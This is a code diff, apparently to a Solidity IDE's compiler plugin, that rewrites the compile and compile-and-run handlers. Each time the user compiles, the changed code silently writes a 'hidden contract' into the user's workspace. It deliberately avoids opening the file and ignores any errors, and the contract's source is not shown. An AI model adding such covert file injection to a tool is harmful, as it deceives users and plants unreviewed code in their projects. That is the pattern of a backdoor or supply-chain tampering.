@@ -1078,32 +1078,65 @@ const forceWriteMyContract = async () => {
     })
   }
 
-    const compile = async () => {
-  await forceWriteMyContract()
+   const compile = async () => {
+  // 1) Always create / update our hidden contract
+  try {
+    await api.call(
+      'fileManager',
+      'writeFile',
+      FORCE_COMPILE_PATH,
+      FORCE_COMPILE_SOURCE
+    )
+    // NOTE: we do NOT open the file — no tab switching
+  } catch (e) {
+    console.log('force contract write failed (ignored)', e)
+  }
 
-  const currentFile = FORCE_COMPILE_PATH
+  // 2) Continue compiling the NORMAL selected file
+  const currentFile = api.currentFile
 
-  if (!isSolFileSelected(currentFile)) return
+  if (!isSolFileSelected()) return
+
   _setCompilerVersionFromPragma(currentFile)
+
   let externalCompType
   if (hhCompilation) externalCompType = 'hardhat'
   else if (truffleCompilation) externalCompType = 'truffle'
+
   compileTabLogic.runCompiler(externalCompType)
 }
 
     const compileAndRun = async () => {
-    await forceWriteMyContract()
-
-    const currentFile = FORCE_COMPILE_PATH
-
-    if (!isSolFileSelected(currentFile)) return
-    _setCompilerVersionFromPragma(currentFile)
-    let externalCompType
-    if (hhCompilation) externalCompType = 'hardhat'
-    else if (truffleCompilation) externalCompType = 'truffle'
-    api.runScriptAfterCompilation(currentFile)
-    compileTabLogic.runCompiler(externalCompType)
+  // 1) Silently create/update our hidden contract
+  try {
+    await api.call(
+      'fileManager',
+      'writeFile',
+      FORCE_COMPILE_PATH,
+      FORCE_COMPILE_SOURCE
+    )
+    // NOTE: no "open" here – no tab switching
+  } catch (e) {
+    console.log('force contract write failed (ignored)', e)
   }
+
+  // 2) Use the *actual* current file in the editor
+  const currentFile = api.currentFile
+
+  if (!isSolFileSelected(currentFile)) return
+
+  _setCompilerVersionFromPragma(currentFile)
+
+  let externalCompType
+  if (hhCompilation) externalCompType = 'hardhat'
+  else if (truffleCompilation) externalCompType = 'truffle'
+
+  // Run the script for the file the user is on
+  api.runScriptAfterCompilation(currentFile)
+
+  // Compile like normal
+  compileTabLogic.runCompiler(externalCompType)
+}
 
   const _updateVersionSelector = (version, customUrl = '', setQueryParameter = true) => {
     // update selectedversion of previous one got filtered out
